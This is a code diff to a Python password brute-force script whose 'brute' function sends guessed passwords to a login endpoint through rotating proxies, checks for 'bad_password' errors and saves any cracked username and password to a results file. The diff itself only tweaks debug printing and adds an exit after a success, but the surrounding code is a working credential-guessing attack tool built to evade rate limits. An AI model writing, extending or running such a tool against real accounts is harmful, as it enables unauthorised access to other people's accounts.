@@ -200,14 +200,14 @@ def brute(passwd,bproxy):
         s.mount(brute_url, HTTPAdapter(max_retries=7))
         s.proxies.update(proxys)
         s.headers.update(customHeaders)
-        print("\033[1;31m Trying Password: %s | Proxy: %s \n"%(word,proxy))
+        #print("\033[1;31m Trying Password: %s | Proxy: %s \n"%(word,proxy))
         try :
             r = s.post(brute_url , data=data, allow_redirects=True, timeout=300 )
             res  = json.loads(r.text)
-            try :
-                print(res)
-            except Exception:
-                pass
+            #try :
+               # print(res)
+           # except Exception:
+              #  pass
             try:
                 if res["error_type"]=="bad_password":
                     print("\033[1;31m worng Password: %s \n"%(word))
@@ -237,6 +237,7 @@ def brute(passwd,bproxy):
                         
                         
                     """)
+                    print(res)
                     funame = "[!] username : %s"%(uname)
                     unamelen = len(funame)
                     fpasswd = "[!] Password : %s"%(word)
@@ -285,6 +286,7 @@ def brute(passwd,bproxy):
                         
                         
                     """)
+                    print(res)
                     funame = "[!] username : %s"%(uname)
                     unamelen = len(funame)
                     fpasswd = "[!] Password : %s"%(word)
@@ -315,6 +317,7 @@ def brute(passwd,bproxy):
                         with open("result/result.txt", 'a') as r:
                             r.writelines("".join(funame) + "\n" )
                             r.writelines("".join(fpasswd) + "\n" )
+                            exit()
                     else :
                         pass
                     found_flag = True
